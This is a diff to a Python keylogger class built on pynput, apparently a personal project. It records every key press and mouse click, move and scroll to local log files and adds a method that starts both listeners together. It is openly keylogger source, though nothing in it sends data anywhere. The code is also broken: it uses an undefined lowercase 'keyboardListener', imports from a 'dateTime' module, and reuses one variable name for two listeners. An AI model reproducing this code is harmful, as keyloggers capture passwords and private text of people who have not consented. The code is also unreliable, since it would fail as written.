@@ -1,6 +1,9 @@
 from pynput import mouse, keyboard
+from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Listener as KeyboardListener
 from dateTime import Datetime
 import arrow
+from sys import exit
 
 class Keylogger:
 	def __init__(self, mouse_log_filename, keyboard_log_filename):
@@ -10,9 +13,9 @@ class Keylogger:
 
 	# mouse have 3 main events (click, move and scroll)
 	# click
-	def on_click(self, x, y, button, pressed):
-		self.write_mouse_log(self.mouse_log_filename, self.date_time.get_date_time() + "{0} at {1}\n".format("Mouse button Pressed " if pressed else "Mouse button Released", (x, y)))
-		if not pressed:
+	def on_click(self, x, y, button, clicked):
+		self.write_mouse_log(self.mouse_log_filename, self.date_time.get_date_time() + "{0} at {1}\n".format("Mouse button Pressed " if clicked else "Mouse button Released", (x, y)))
+		if not clicked:
 			self.stop_mouse_listener()
 	#Move
 	def on_move(self, x, y):
@@ -23,12 +26,12 @@ class Keylogger:
 		self.write_mouse_log(self.mouse_log_filename, self.date_time.get_date_time() + "Mouse Scrolled {0} at {1}\n".format("Down" if dy < 0 else "Up", (x, y)))
 		
 	def start_mouse_listener(self):
-		with mouse.Listener(
+		with MouseListener(
 			on_click = self.on_click,
 			on_move = self.on_move,
 			on_scroll = self.on_scroll
-			) as listener:
-			listener.join()
+			) as mouseListener:
+			mouseListener.join()
 
 	# Keyboard have two main event (press, release)
 	# press
@@ -46,14 +49,18 @@ class Keylogger:
 
 	def start_keyboard_listener(self):
 		# Collect events until released
-		with keyboard.Listener(
+		with keyboardListener(
 			on_press = self.on_press,
 			on_release = self.on_release
-			) as listener:
-			listener.join()
+			) as keyboardListener:
+			keyboardListener.join()
+	# Start both keyboard and mouse listeners !
 	def start_listener(self):
-		pass
+		with MouseListener(on_click = self.on_click, on_move = self.on_move, on_scroll = self.on_scroll) as listener:
+			with KeyboardListener(on_press = self.on_press, on_release = self.on_release) as listener:
+				listener.join()
 	def stop_mouse_listener(self):
+		exit("")
 		return False
 	def stop_keyboard_listener(self):
 		pass
